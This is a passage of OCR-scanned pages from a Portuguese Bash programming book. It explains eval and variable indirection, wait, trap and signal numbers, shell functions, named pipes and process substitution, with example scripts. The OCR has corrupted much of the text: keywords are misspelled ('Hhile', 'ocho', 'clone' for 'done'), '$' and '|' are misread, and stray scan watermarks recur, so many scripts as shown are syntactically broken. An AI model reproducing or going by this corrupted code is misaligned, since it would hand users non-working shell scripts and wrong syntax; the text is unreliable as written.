passada para ele como argumento; então, o Shell processa esta linha de 
comandos enquanto passa os argumentos para o eval, e novamente a linha 
de comandos é executada, desta vez pelo eval. O efeito resultante é a dupla 
execução da linha de comando pelo Shell. 
291 
~1atcria com d r bs auto a.~s 
292 Programação Shell Linux 
$ eval 
echo "Meu L oqin Name eh SLOGNAME" 
He u Login Name eh j ulio 
Essa linha de comandos produziUJ o mesmo resultado que teria, caso 
não tivesse sido usado o e v a l. 
Exemplo: 
Considere agora o exemplo seguinte sem o uso do eval: 
$ paipi= • 1• 
$ ls $paipi wc - 1 
I : No s uch file o r di r ectory 
HC: No such fil e oz- directol.'y 
- 1 : No .suc h fíle o r director y 
Esses erros são oriundos do comando 1s. O She/1 tentará fazer os pipe-
lines e os redirecionamentos de E/S (l/O) antes da substituição das variá-
veis, então ele nunca reconhecerá o símbolo de pipe ( 1) dentro da variável 
Spaipi. O resultado disso é que 1, wc, - 1 são interpretados como parâ-
metros do comando l s . 
Se pusermos o e val na frente da linha de comandos, teremos o resulta-
do desejado. Então, temos que fazer: 
$ eval ls $pai p i wc -1 
37 
Vejamos um outro exemplo: este necessitará fazer uma indireção. Cha-
mamos de indireção o fato de se pegar o valor de uma variável a partir de 
outra que aponta para esta primeira: 
$ cat medieval 
11 
# 
medieval -
!10dulo-~xemplo ga !.nstcucao EVAL 
echo Recebi $ # parametros . 
i=l 
Hhile [ "$i" -le $ ft } 
do 
echo - e "pararne t ro Si 
\ c " 
echo $ "echo $i 
l et i+ + 
done 
~1atcria com d r bs auto a.~s 
$ mediéval Marcos Valdo da Costa Freitas 
Recebi 5 p~rametros . 
parametro 1 
$1 
parametro 2 
$2 
parametro 3 
$3 
parame~ro 4 
$4 
parametro s 
$S 
Sacos de gatos 
293 
No exemplo anterior, queríamos mostrar os parâmetros passados para 
o script medieval, numerando-os. Quase conseguimos, só faltou o She/1 
resolver os parâmetros posicionais, isto é, quando na execução do script 
o She/1 chegou até aos nomes dos parâmetros ($1, 
$2, ... $5) , faltando 
então mais uma passada do interpretador para resolvê-los. 
Para dar esta passada a mais, é que usaremos o comando eval. Veja-
mos então como ficará: 
$ cat medieval 
i 
i 
medieval -
!1odulo- Exe:rnplo Da In.stt:ucao EVAL 
~ 
ccho $# parnmctros . 
i =l 
whilt. [ "$i" - !e H 
do 
\c:" 
echo - e "para me tro $i 
eval echo $ ' echo $i ' 
l et i++ 
A 1' faz tchan, a 2' faz tchun e tchan, tchan ... 
done 
$ medieval Marcos Val do da Costa Freitas 
Recebi 5 parametros . 
parametro 1 
l1arcos 
parametro 2 = Valdo 
parametro 3 • da 
parametro q c Costa 
para~tro 5 
~ Fr~itas 
Isso também poderia ter sido feito assim: 
$ C A t medieval 
~ 
# 
mêdieval - Modulo- Exemplo Da Inst.rucao EVAL 
~ 
echo Recebi $i parametros . 
~1atcria com d r bs auto a.~s 
294 Programação Shell Linux 
t•l 
while [ " $i" - le S ô j 
do 
êCho -o "parame tro Si a \c'• 
oval <>cho \$$i 
A I na 1' passagem inibe a interpretação doS 
let i + + 
done 
Como o comando defau/t do eval é o echo, ele se torna desnecessário 
e o programa poderia ficar assim: 
$ cat medie:val 
;; 
I 
nledieval -
l-1odulo- Exemplo 0 .. '1 Inst.rucao EVA.L 
eçho Rec@bi $~ parametros . 
t =l 
·.·lhile ! "$i" - h 
H I 
do 
\c::" 
echo -~ " paralu~tro Si 
eval \S$i 
A I na 1' passagem inibe a interpretação do S 
let i +-t· 
done 
Para finalizar essa série com o mesmo exemplo, que nem eu estou 
aguentando mais, o Bash, a partir da versão 2, incorporou a seguinte para-
meter substitution para fazer indireção, que no meu entender é mais sim-
ples e intuitiva. 
cat medieval 
i 
medieval - 11odulo - g:-:emp!o Da Inst.rucao EVAL 
B 
echo $! drqumento~
. 
i =l 
.,,hile [ " $i" - le $ii 
do 
clone 
echo - n "parametro Si = 
eeho $t !i t 
Mate 
com d re l s 
1 • s 
Sacos de gatos 
295 
Um dos participantes da lista de Shell-script do Yahoo disse que tinha 
um arquivo chamado dados . txt, cuja linha era assim: 
Hodel =Sa m.sun9 0411N1 Scrial=00000005464 , blablab l a=asdadqddq 
Porém deste, só interessava o nome do modelo rsamsung 04 11NJ . 
As soluções apresentadas foram as mais variadas possíveis (como to-
das daquela excelente lista, que aconselho a todos se inscreverem). Veja 
só algumas, para que sirvam como exemplo: 
$ e u t - f l -d, dados . txt I cu t - f2 - d• 
Só mais umazinha: 
$ sed -n ' .. /Model=\ 1 [' , J *\ ) . *$/\ 1/p' dados. txe 
O Fabiano Caixeta Duarte, grande conhecedor de Bash, deu a seguinte 
solução, desculpando-se por esta ser deselegante: 
$ Linha=$(<dado .. . txt) 
$ Lí nha=$(Linha/ / / _ ) 
$ e val $ {Linha%%, *) 
$ e c ho $ (Model/ / _ / ) 
Sarns ung 041 UI 
Escrevi imediatamente para a lista dizendo que a solução não tinha nada 
de deselegante, muito pelo contrário, pois usava Bash puro e que, por isso, 
deveria ser muito mais eficiente e veloz que todas as soluções apresenta-
das. Vou explicá-la linha a linha: 
linha 1 -
Carrega todo o arquivo dados . txt para a variável $Linha; 
linha 2 -
Para não ter problemas na linha 3, esta substituição de parâmetros 
troca os espaços por sublinha t_J; 
linha 3 -
Esta substituição de parâmetros despreza tudo à direita da 
primeira vírgula r. 1 . Observe o que acontece se trocarmos o 
eval por echo : 
$ eoho ${Li nha%%, *) 
!1odcl• Sarnsung_ 0411N 
~1atcria com d r bs auto a.~s 
296 Programação Shell Unux 
Ou seja: uma atribuição, porém com um sublinha u onde havia 
um espaço em branco. O eval foi usado para que esta atribuição 
fosse feita. Veja este teste após a execução desta linha: 
$ echo $Model 
Samsung_OHJN 
linha 4 - Pronto! Agora só falta trocar o sublinha (_) por um espaço 
em branco, e foi isso que a substituição de parâmetros desta 
linha fez. 
wait a minute Mr. Postman 
Se você passar uma linha de comandos para execução em background, 
essa linha de comandos será executada em um Subshe/1 que é indepen-
dente do seu She/1 corrente (diz-se que está em modo assíncrono). Al-
gumas vezes é conveniente esperar que a execução desse processo em 
background termine antes de prosseguir. 
Suponha que você tenha um grande arquivo que deva ser classificado, 
cujo sort foi mandado para background, e agora deseja esperar o fim deste 
sort já que você precisa usar estes dados classificados. 
Para isso usamos o comando wait e seu formato geral é: 
wait I?ID 
Onde PIO é o Process-IO de que desejamos aguardar a conclusão. 
Se omitido, o She/1 espera a finalização de todos os processos filhos. A 
execução do She/1 corrente é suspensa até que o processo ou processos 
terminem a execução. Vamos ver um exemplo desenvolvido direto no 
terminal: 
$ sort ArqGrande -o ArqGrande & 
6924 
$ . . .. 
$ wait 6924 
$ 
Manda para background 
O PIO é mandado para a tela pelo She/1 
Execute outras tarefas independentes ... 
Agora espera o final do sort para prosseguir 
Qvando o sort termina, o prompt é devolvido 
Sacos de gatos 
297 
Para evitar trapalhadas use o trap 
Quando você descontínua a execução de um programa, seja teclando 
DELETE, 
BREAK ou <CTRL>+c no seu terminal durante a execução de um 
script, normalmente este programa é imediatamente terminado e o prompt 
do terminal é retomado. Isso nem sempre é desejável. De repente você 
está largando alguma sujeira (opa! Você não, o scripl!), como um arquivo 
temporário, que deveria ser limpa. 
A finalização de um programa, entre outras coisas, manda o que co-
nhecemos como sina/ para o programa ainda em execução. O programa 
pode então especificar qual atitude deve ser tomada quando receber um 
determinado sina/. Isso deve ser feito com o comando trap. cujo uso 
geral é: 
r.rap "<comandoJ>; <comando>; < •. . >: <comando0> .. a1na1s 
Onde <comando,>: <comando.>: < ... >: <comando,> significa um ou mais 
comandos (separados por ponto e vírgula, claro) que serão executados 
caso um dos sinais especificados por sinais seja recebido. 
Números são associados aos diferentes tipos de sinais, e os mais comu-
mente usados em programação Shell, por normalmente significarem fim de 
execução de programa. estão listados na tabela a seguir: 
Sinal 
Gerado por 
o 
EXIT 
Salda normal do programa 
1 
SIGHUP 
Quando recebe um kill -HUP 
2 
SIGINT 
Interrupção pelo teclado ( <ctrt>+C ) 
3 
SIGQUIT 
Interrupção pelo teclado ( <ctrl>+\) 
15 
SIGTER~l 
Sinal de terminação do software (mandado pelo 
ld 11 default OU Ri 11 PIO) 
Exemplo: 
Vamos voltar ao exemplo dado lá no início do livro (na seção Direcionan-
do os caracteres de redirecionamento). Veja só: 
~la:cnu 
mJo 
298 Programação Shell Linux 
$ ft.p -ivn remocomp << F'imf"TP >> /tmp/ $$ 
> 
use~ ful ano s egredo 
> 
bin.etr y 
> 
get .arqntHla 
> Fimf1·p 
s 
2» /t:np/ SS 
Os sinais > são prompts secundários do UNIX 
Enquanto não surgir o /abe/ FimFTP o> sera o 
prompt (P$2), para indicar que o comando não 
terminou 
Repare no trecho do f tp anterior em que, tanto as saídas do f t p como 
os erros encontrados, estão sendo redirecionados para /tn>p / $$ . Caso 
este ftp seja interrompido por um kill ou um <CTRL>+c , certamente dei-
xará lixo no disco. É exatamente essa a forma como mais se usa o coman-
do trap. Se o ~tp anterior fosse trecho de um script, deveríamos, logo no 
início desse script. como um de seus primeiros comandos, fazer: 
<rap " rm - f /tn:p/$S ; oxit" O 1 2 3 15 
Dessa forma, caso houvesse uma interrupção brusca (sinais 1, 2, 3 ou 
15) antes do programa encerrar (no exir. dentro do comando trap). ou um 
fim normal (sina/ 0), o arquivo / tmp/Ss seria removido. 
Caso na linha de comandos do trap não houvesse o comando exit, 
seus comandos seriam executados e o fluxo do programa retornaria ao 
ponto em que estava quando recebeu o sinal para execução deste t r ap. 
Caso a linha de comandos do trap possua mais do que um comando, 
eles deverão estar entre aspas 1 "" 1 ou apóstrofos 1 • • > . Note também 
que o She/1 pesquisa a linha de comandos enquanto o trap é interpretado 
e novamente quando um dos sinais listados é recebido. Então, no último 
exemplo, o valor de ss será substituído no momento que o comando t rap 
for executado da primeira vez, já que as aspas t " " 1 não protegem o cifrão 
(S! da interpretação do She/1. Se você desejasse que a substituição fosse 
realizada somente quando recebesse o sinal, o comando deveria ser colo-
cado entre apóstrofos ( • ·, . Assim, na primeira interpretação do uap, o 
She/1 não veria o cifrão ts >, porém os apóstrofos ( · · l seriam removidos e 
finalmente o She/1 poderia substituir o valor da variável. Nesse caso, a linha 
ficaria da seguinte maneira: 
t~ap ' rm - f 
/ t w~/$$
; ex it' O 1 2 15 
Mate 
com d re l s 
l • s 
Sacos de gatos 
299 
O comando t r ap, quando executado sem argumentos, lista os sinais 
que estão sendo monitorados no ambiente, bem como a linha de comando 
que será executada quando tais sinais forem recebidos. 
Se a linha de comandos do tra p for nula (vazia), isso significa que os 
sinais especificados devem ser ignorados quando recebidos. Por exemplo, 
o comando: 
trap "" 2 
Especifica que o sinal de interrupção deve ser ignorado, porque você 
pode querer ignorar certos sinais quando executar alguma operação. No 
caso citado, quando não se deseja que sua execução seja interrompida. 
Note que o primeiro argumento deve ser especificado para que o sinal 
seja ignorado, e não é equivalente a escrever o seguinte, cuja finalidade é 
retornar o sinal2 ao seu estado default; 
tcap 2 
Se você ignora um sinal, toqos os Svbshells irão ignorÇJr esse sinal, Por-
tanto, se você especifica qual ação deve ser tomada quando receber um 
sinal, então todos os Subshells irão também tomar a ação quando recebe-
rem esse sinal. Para o sinal que temos mostrado (sinal2), isso significa que 
os Subshells serão encerrados. 
Suponha que você execute o comando: 
t.cap .... 2 
e então execute um Subshe/1, que tomará a executar outro script como um 
Subshe/1. Se for gerado um sinal de interrupção, este não terá efeito nem 
sobre o She/1 principal nem sobre os Subshe/1 por ele chamados, já que 
todos eles ignorarão o sinal. 
Outra grande aplicação do t r ap <é tornar programas mais amigáveis. 
Caso você estivesse executando um programa do tipo menu (ex: teles) que 
tivesse chamado outro (ex: pp) e caso este último recebesse um sinal para 
ser descontinuado, por intermédio do comando trap poderíamos fazer com 
que o comando do programa fosse devolvido para o programa anterior, no 
caso o menu (teles). Bastaria fazermos: 
t:.rap : 2 
~1atcria com d r bs auto a.~s 
300 Programação Shell Linux 
e então executasse Subshells, quando recebesse o sinal de interrupção, o 
She/1 pai o ignoraria (ele executará o comando nulo ou : ), porém os subse-
quentes (filhos) que estivessem ativos seriam encerrados. 
Se você mudou a ação default a ser tomada quando receber um sinal, 
você pode desfazer isso usando o comando t rap . se você simplesmente 
om itir o primeiro argumento, então: 
trop 1 2 
retomará a ação a ser tomada no recebimento dos sinais 1 e 2 para o default. 
Se você deseja dar uma saída personalizada na sua sessão, basta colo-
car a linha a seguir no seu .bash_profile ou .bashrc . 
t rap ' echo -n "Fi m da sessão$$ em "; date; sleep 2 ' O 
ou: 
t.rap ' echo - n ''Fim da sessão $$ em "; date ; s l eep 2' EXIT 
Procedendo assim, quando as suas sessões encerrarem, você ganhará 
por dois segundos uma mensagem do tipo: 
Fim da sessão 1234 em Thu Dec 29 13 : 49 : 23 BRST 200$ 
Para terminar este assunto, abra uma console gráfica e escreva no 
prompt de comando o seguinte: 
$ trap "echo Mudou o tamanho da janela" 28 
Em seguida, pegue o mouse (arghh!!) e arraste-o de forma a variar o 
tamanho da janela corrente. Surpreso? É o Shell orientado a eventos ... :) 
Esse sinal é legal para você gerenciar telas que mantenham a mesma 
formatação, mesmo se o tamanho da uanela for alterado (lembra-se do tput 
Unes e do t put col s ? ) 
Mais unzinho só, porque não pude resistir. Agora escreva assim: 
$ t rap "ocho já ar~~~ 17 
Em seguida faça: 
$ s locp 3 & 
~1atcria com d r bs auto a.~s 
Sacos de gatos 
301 
Você acabou de criar um subshe/1 que irá dormir durante três segundos 
em background. Ao fim desse tempo, você receberá a mensagem já era, 
porque o sinal 17 é emitido a cada vez que um subshe/1 termina a sua 
execução. 
Para devolver esses sinais aos seus defaults, faça: 
$ trap 17 28 
ou 
$ trap -
1 7 28 
Acabamos de ver mais dois sinais que não são tão importantes como os 
que vimos anteriormente, mas vou registrá-los na tabela a seguir: 
17 
SIGCHLD 
F'm de um processo filho 
28 
SIGWINCH Mudança no tamanho da janela gráfica 
Funções 
A partir do Re/ease 2 do System V do UNIX, a interpretação de funções 
foi agregada ao Shell com o seguinte formato geral: 
funcao () 
{ comando. ; comando, ; ... ; comando. ) 
Ou então, para tornar mais legível: 
funcao () 
comando1 
comando 
comando 
'" 
onde funcao é o nome da função, os parênteses dizem ao She/1 que uma 
função está sendo definida, e os comandos envolvidos pelas chaves < 1 l ) 
definem o corpo da função. 
302 Programação Shell Linux 
Esses comandos serão executados sempre que a função f unc ao for cha-
mada à execução. Note que pelo menos um espaço em branco deve ser 
colocado entre os comandos (primeiro e último) e as chaves de início e de 
fim ( 1 1 >. 
Os argumentos listados após a chamada da função na linha de coman-
dos do programa, são tratados pela função como se fossem parâmetros 
posicionais $1, $2 , 
. .. , como qualquer outro comando. 
Exemplo: 
Suponhamos que o programa solicitasse um valor a um campo, cuja 
entrada de dados é feita pelo teclado, e o mesmo fosse informado com 
valor nulo, o programa interpretaria esta como uma possível desistência do 
operador. A leitura de cada campo po-deria ser feita da seguinte maneira: 
Hhi le t..rue 
do 
Loop de leitura 
done 
read i st.o 
if 
[ ! ".$isto'' 
t hen 
li 
Pergunta "Deseja continuar" s N' 
i f 
I " $SN" • N ) 
then 
e x i t 
fi 
cont.inue 
Se o campo estiver vazio ... 
Veía: 1• parm. =frase. 2' valor defauH. 3' o outro. 
Vamos ver se o operador continua ou desiste. 
A minha função Pergunta recebe como primeiro parâmetro a frase que 
será exibida (que é a própria pergunta), o segundo parâmetro é a resposta 
considerada default (a que tem mais probabilidade de ocorrer) e o terceiro 
parâmetro é o outro valor possível. 
Para desenvolver a função, parti de alguns pressupostos: 
A função colocaria um ponto de interrogação no final da frase; 
Após o ponto de interrogação, seria oferecido o valor defaulf, seguido de 
um par de barras (/ /) para convencionar que aquele valor é o default; 
Este conjunto definido no item anterior seria exibido no centro da 
penúltima da linha. 
~1atcria com d r bs auto a.~s 
Sacos de gatos 
303 
A função que foi escrita tem a seguinte cara: 
?ergunta () 
DefVal• ~ echo "S2" 1 tr "a-z" "A-ztt • 
OthVal=-"echo "$3" I t.r ''a- z" "A- Z" " 
Quest='echo "$1? SDefVal//" ' 
Cols•' tput cols' 
Lins=·cput lines· 
Lin=·expr SLins - 2' 
Tam=' expr length "SQuest" · 
Col='expr \( SCols - $Tam \) I 2' 
tput cup SLin SCol 
echo -e "SQuest\07\c" 
read SN < /dev/tty 
SN=$(SN :- "$DefVal") 
SN•'echo SSN I tr " [a- z) " '' (A- ZJ " ' 
if [ "SSN" != "SOthVal" l 
then 
SN• "$DefVal " 
fi 
tput cup SLin O 
tput el 
return 
Converte o valor default para maitiscula 
Idem com o outro valor 
A variável Quest recebe o texto já montado 
Total de ootunas do terminal corrente 
Total de linhas do terminal corrente 
Penúltima linha 
} Cenl/alizo o texto na penú!Uma linha 
O \07 é o beep, em LINUX pode-se usar la 
Variável SN recebe a resposta do operador 
Se operador deu <ENTER>, SN rocebe default 
Converte resposta para maiúscula 
Qualquer coisa que não seja o outro valor. .. 
Será tomada como o valor defau# 
Posícionando no início da linha da pef!lunta 
A~ando a linha inteira 
Usei o exemplo dessa forma para melhorar o seu detalhamento. Mas, 
como o She/1 é um interpretador (acho que intérprete fica melhor, né?), ele 
lê o programa sequencialmente, do início para o fim, e só entenderá uma 
chamada de função caso ele leia a sua declaração antes dessa chamada. 
Com isto eu quero dizer que a boa estruturação de um programa deve ser 
feita conforme o gráfico a seguir: 
Declaração de Variáveis 
Globais 
Área de EspeciflcaQões 
das FU'IÇÕeS 
Corpo do 
Programa 
304 Programação Shell Linux 
Nesse gráfico, o que é chamado de declaração de variáveis globais é a 
área onde se deve especificar as variáveis que serão vistas pelo corpo do 
programa, e por alguma(s) função(ões) e/ou por algum(ns) Subshell(s). 
Eu não posso deixar de fazer este comentário! Programas de baixa per-
formance me incomodam! O negócio é o seguinte: temos sempre que to-
mar uma decisão envolvendo performance x legibilidade. Como um lívro 
tem que ser didático, normalmente opto pela legibilidade, mas esteja livre 
para fazer as suas criticas e enxugar códigos, veja só estas três linhas do 
programa anterior: 
Tam:z · e xp.r l ength 
" $Que~ t. "
' 
Col=·expr \( SCols - STam \ ) I 2 
tput cup $Lin $Col 
Poderiam ser substituídas por esta: 
tpuc cup SLin · expr \( scols - l ength •souest" \J I z· 
FIFO 
Um recurso muito útil que o LINUX/UNIX lhe oferece são os named pipes, 
que permitem a comunicação entre processos diferentes. 
Uma característica fundamental que é extremamente útil aos usuários 
LINUX/UNIX é o pipe. Os pipes permitem que processos separados se 
comuniquem sem terem sido desenvolvidos para trabalhar juntos. Isso per-
mite que ferramentas bastante específicas em suas funções sejam combi-
nadas de formas complexas. 
Um exemplo simples do uso de pipes é o comando: 
$ l s I fgrep que 
Quando o She/1 examina a linha de comandos, ele acha a barra vertical 
< 1 , que separa os dois comandos. O She/1 executa ambos os comandos, 
conectando a saída do primeiro à entrada do segundo. 
O programa 1s produz a lista dos arquivos no diretório corrente, en-
quanto o t 9 rep lê a sai da do 1 s e imprime somente aqueles que contêm a 
cadeia que em seus nomes. 
Mate 
com d re l s 
1 • s 
Sacos de gatos 
305 
O exemplo mostrado antes, que já é familiar a vocês, é um exemplo de 
um unamed pipe. O pipe existe somente no interior do kernel e não pode 
ser acessado pelo processo que o criou, neste caso, o She/1. 
Um outro tipo de pipe é o named pipe que também é chamado de FIFO. 
FIFO é um acrônimo de "First In First Ouf', que se refere à propriedade 
em que a ordem dos bytes entrando no pipe é a mesma que a da saída. O 
name em named pipe é, na verdade, o nome de um arquivo. Os arquivos 
tipo named pipes são exibidos pelo comando ls como qualquer outro, com 
poucas diferenças: 
$ ls -1 fifol 
prw-r-r--
1 julio dipao 
O Jan 22 23 : 11 fifoll 
Este não é o ls -1 a que você está habituado 
o p na coluna mais à esquerda indica que fifol é um named pipe. O resto 
dos bits de controle de permissões, quem pode ler ou gravar o pipe, funcio-
nam como um arquivo normal. Nos sistemas mais modernos um caractere 1 
colocado ao fim do nome do arquivo é outra dica, e nos sistemas LINUX, 
onde a opção de cor está habilitada, o nome do arquivo é escrito em verme-
lho por default. 
Nos sistemas mais antigos, os named pipes são criados pelo programa 
mknod, normalmente situado no diretório /etc. Nos sistemas mais moder-
nos, a mesma tarefa é feita pelo mktifo . O programa mkfifo recebe um ou 
mais nomes como argumento e cria pipes com estes nomes. Por exemplo, 
para criar um named pipe com o nome pipel, faça: 
$ mkfifo pipel 
Exemplo: 
Como sempre, a melhor forma de mostrar como algo funciona é dando 
exemplos. Suponha que nós tenhamos criado o named pipe mostrado an-
teriormente. Em outra sessão ou uma console virtual, faça: 
$ l s - 1 > pipel 
e em outra, faça: 
$ cat < pipel 
306 Programação Shell Linux 
Voilà! A saída do comando executado na primeira console foi exibida na 
segunda. Note que a ordem em que os comandos ocorreram não importa. 
Se você prestou atenção, reparou que o primeiro comando executado 
parecia ter "pendurado". Isso acontece porque a outra ponta do pipe ainda 
não estava conectada, e então o kernel suspendeu o primeiro processo até 
que o segundo "abrisse" o pipe. Para que um processo que usa pipe não 
fique em modo de wait, é necessário que em uma ponta do pipe tenha um 
processo "tagarela" e na outra um "ouvinte". 
Uma aplicação muito útil dos name.d pipes é permitir que programas sem 
nenhuma relação possam se comunicar entre si. 
Por exemplo, um programa que se;rve algum tipo de requisição (imprimir 
arquivos, acessar banco de dados) poderia abrir o arquivo de pipe para lei-
tura (seria o processo "ouvinte"). Então, outro processo poderia fazer essa 
requisição abrindo o pipe, passando o comando (este seria o "tagarela"). 
Isto é, o "servidor" poderia executar uma tarefa em benefício do "cliente". 
Exemplo: 
Suponha que, para não gerar inconsistências em um arquivo que seja 
alterado por muitos usuários, todas as inclusões, exclusões e alterações de 
registros sejam feitos por um só programa servidor que sempre estará em 
backgound. Veja só como ficaria simples: 
$ mkfifo pipel 
$ ls - 1 p i pel 
Criando um arquivo üpo pipe 
pr~- r--r--
1 jneves 
ssup 
o Jan 14 17 : 48 pipel 
$ c::at cliente 
B! /binhh 
c l ear: 
echo " 
tput cup 10 47 
read Opc 
tput cup 12 26 
case $Opc in 
Coletor de dados para atualização do allJUivo (tagarela) 
O que voce deseja fazer? 
1 -
Incluir 
2 -
~xcluir 
3 - Alte.rar 
! nfot:n\e a sua opcao : •• 
~1atcria com d r bs auto a.~s 
e~ac 
1) 
echo "Informe o conteudo do novo registro:" 
tput cup H 
26 
read Reg 
Cmd• a 
; ; 
2) 
echo "Exclusao d& qual registro?" 
tput cup 14 26 
read Reg 
Cmd~d 
; ; 
3) 
e cho "In forme o texto antigo: " 
tput cup 14 26 
J;ead Reg 
tput cup H 
Z6 
echo "' Informe 
tput cup 18 26 
read Txt 
Cmd• c 
'") 
echo 
exit 
o novo texto :" 
echo "$Ct!'..d : $Reg : $Txt " > pipel 
Veja agora o programa que atualiza o arquivo. 
Sacos de gatos 
307 
$ c a t .servi dor 
Prog em background que atualiza o arquivo (ouvinte) 
trap "rm /tmp/$$ 2> /clev/null; e ú t " O 1 2 15 
'<lhilc t.rue 
do 
Cmd= • cat pipe l · 
case · echo $Cmd 1 c ut - fl - d : · in 
•) 
echo ' echo $Cmd I cut - fZ -d : • >> arquivo 
d) 
g rcp - v "echo $Cmd l c ut - f2 - d : · a rquivo > /tmp/$$ 
mv - f / tmp/$$ arquivo 
c) 
Era Assim= · echo SCmd I cut. .. f2 -d : · 
SeraAssirn=' echo SCrnd I cut - f3 - d : · 
sed "s/SEraAssim/$SeraJcssirn/" arquivo > /tmp/$S 
mv - f / t rnp/$$ arquivo 
esac 
done 
~1atcria com d r bs auto a.~s 
308 Programação Shell Linux 
Uma outra forma (menos nobre) de utilizarmos o FIFO é para sincroni-
zação de processos. Suponha que você dispare paralelamente dois pro-
gramas (processos) cujos diagramas de blocos de suas rotinas são como 
a figura a seguir: 
Rotina de 
classificação (sort) 
de três grandes 
arquivos 
BLOC02 
Rotinas de acenos e 
BLOCO I 
Rotina de abertura e 
BLOC02 
Rotina de impressão 
do dados 
classificados pelo 
programai 
Os dois processos são disparados em paralelo e no BLOCOl do Programai 
as três classificações são disparadas da seguinte maneira: 
for Arq in BigFilel BigFi1e2 Bigfile3 
do 
done 
if son SArq 
then 
else 
fi 
Manda-va 
Manda=pare 
break 
echo $Handa > pipel 
[ $Manda = pare J && 
[ 
echo Erro durante a classificação dos arquivos 
exit 1 
J 
Assim sendo, o comando if testa cada classificação que está sendo 
efetuada. Caso ocorra qualquer problema, as classificações seguintes são 
abortadas, uma mensagem contendo a cadeia pare é enviada pelo pipel 
e programal é descontinuado com um fim anormal. 
Sacos de gatos 
309 
Enquanto o Programai executava o seu primeiro bloco (as classifica-
ções) o Programa2 executava o seu awco1, processando as suas rotinas 
de abertura e menu paralelamente ao Programai. ganhando dessa forma 
um bom inteNalo de tempo. 
O fragmento de código do Pro9rama2 a seguir mostra a transição do seu 
Bt.OCOl para O Bl.OC02 : 
OK•·cat. pipel 
lf 
( SOK = va 
then 
el se 
e xit 1 
li 
Recebeu •pare• em OK 
Após a execução de seu primeiro bloco, o Programaz passará a "ouvir" 
o pipel , ficando parado até que as classificações do Pro g ramai terminem, 
testando a seguir a mensagem passada pelo pipel para decidir se os ar-
quivos estão íntegros para serem impressos, ou se o programa deverá ser 
descontinuado. 
Substituição de processos 
O She/1 também usa os named pipes de uma maneira bastante singular. 
Como já vimos, quando um comando está entre parênteses, ele na reali-
dade é executado em um subshe/1 Como o She/1 atual recebe uma saída 
única desse subshe/1, se agruparmos diversos comandos sob um par de 
parênteses, essa saída poderia ser redirecionada como uma unidade. Por 
exemplo, o comando: 
$ (pwd ; ls -l) > saida.out 
enviará a saída de dois comandos <o pwd e o l s - ll para o arquivo 
saida .o uc. Uma substituição de processos (process substit ution) ocorre 
quando você põe um < ou um > grudado na frente do parêntese da esquer-
da. Teclando-se o comando: 
$ eat < (ls -l) 
O< tem que estar colado no paréntese 
Mate 
com d re l s 
1 • s 
310 Programação Shell Linux 
Resultará no comando ls -1 executado em um subshe/1 como é nor-
mal, porém redirecionará a saída para um named pipe temporário, que 
o She/1 cria, nomeia e depois remove. Então o cat terá um nome de ar-
quivo válido para ler (que será este named pipe e cujo dispositivo lógico 
associado é /dev/fd/6 3 ) , e teremos a mesma saída que a gerada pela 
listagem do 1s -1, porém dando um ou mais passos que o usual. Essa 
técnica chama-se process substitution ou substituição de processos. 
Similarmente, dando >(comando) resultará no She/1 nomeando um pipe 
temporário do qual o comando dentro dos parênteses lê a entrada. 
Você deve estar pensando que isso é uma maluquice de nerd, né? Então 
suponha que você tenha 2 diretórios: di r e d n.bkp e deseja saber se os 
dois estão iguais (aquela velha dúvida: será que meu backup está atualiza-
do?). Basta comparar os 2 diretórios com o comando cmp, fazendo: 
$ cmp <(ls -la dirl) <(lo -la dir.bkp) 
O comando cmp, cuja entrada só aceita arquivos, irá receber a listagem 
dos dois diretórios como se fossem arquivos (named pipes temporários ou 
/dev/fd/63 ) , lê-los e compará-los. 
Outro exemplo: 
$ echo $impar 
l 3 5 ' 
$ echo $par 
2 4 6 e 
S paste < (e<:ho $impar I tr " • " \012" ) < (echo $par I tr " • "\012") 
1 
2 
3 
4 
5 
6 
7 
8 
No último exemplo, o comando tr transformou os espaços em branco 
das variáveis impares e pares em <ENTER> (usei a notação octal \012, 
mas no Linux poderia ter usado \n) e cada um desses grupamentos de co-
mandos gerou um arquivo temporário que pôde ser lido pelo paste . 
Tanto o ta r quanto o b zip2 necessitam de arquivos para serem felizes e 
executar corretamente as suas atribuições. Então para gerarmos um arquivo 
do tipo . ta r. bz2 teríamos de executar primeiramente o ta r e, na sua saída, 
Male 
com d re l s 
l • s 
Sacos de gatos 
311 
executar o bzip2 . Usando a técnica de substituição de processos, podería-
mos fazer o mesmo de forma mais compacta conforme o exemplo a seguir: 
$ tar cf >(bzip2 -c > arquivo.tar .bz2) $NomeDiretorio 
Esmiuçando esse exemplo: primeiramente é feito um t a r no arquivo apon-
tado pela variável $Nomeoiretorio e a sua saída é mandada para o arquivo 
temporário / d ev/fd/63, que é um named pipe usado para canalizar a saída 
do comando tar para o bzip2, gerando desta maneira o arquivo . tar .bz2 . 
O último exemplo para atestar a versatilidade da substituição de pro-
cessos vem a seguir e é um fragmento de código extraído de um script da 
distro SuSE: 
\·thile read 
des what mask if.!lee; do 
il 
col!lllndos •. • 
done < <{route - nl 
Para testá-lo, vamos substituir coma ndos . . . por alguma besteira sem 
sentido, tal como: 
.,,hile read des v1hat mas k i face; do 
echo $des $"1hat $mask $iface 
clone< <{Loute -nl 
Que reproduziria a tabela de roteamento IP do kernef. Outra forma de cumprir 
a mesma tarefa, porém mais fácil de entender do que esta, seria a seguinte: 
.rouee - n I 
Hhile re-ad dett "'hat ma$k ifACé'; do 
echo $des Swhat. Smasl: $ifacê 
clone 
Apesar dessa forma de codificação produzir uma saída idêntica à anterior, 
o uso do pipe c 1 J gera um subsheff para a execução do laço (foop) while ; 
do . . . done e portanto alterações de valores de variáveis no seu interior 
seriam perdidas ao término desse subsheff. Assim sendo, se fizéssemos: 
route -n I while read x 
do 
( (y++) ) 
done 
echo $y 
~1atcria com d r bs auto a.~s 
312 Programação Shell Unux 
Não obteríamos saída alguma porque a variável sy não teria sido sequer 
criada no She/1 corrente, no entanto se fizéssemos: 
while read x 
do 
((y++)) 
done < <Croute -n) 
echo Sy 
Teríamos como saída a quantidade de linhas geradas pelo comando 
route -n . 
Já que estamos no finalzinho desta seção, que você teve tanta paciência 
para ler, vejamos se a substituição de processos (process substitution) é 
mesmo feita via um named pipe temporário: 
$ 1s -1 > (cat) 
1-wx------ 1 jneves jneves 64 Aug 27 12 :26 /dev/fd/63 - > pipe : [7039] 
$ 1s -1 > (cat) 
1-wx------
i jneves jneves 64 Aug 27 12 :26 /dev/fd/63 -> pipe : [7050] 
É, realmente é um named pipe. 
A substituição de processos também pode ser misturada, você pode ver 
que o exemplo a seguir 
$ cat <(cat <(cat <(1s -1))) 
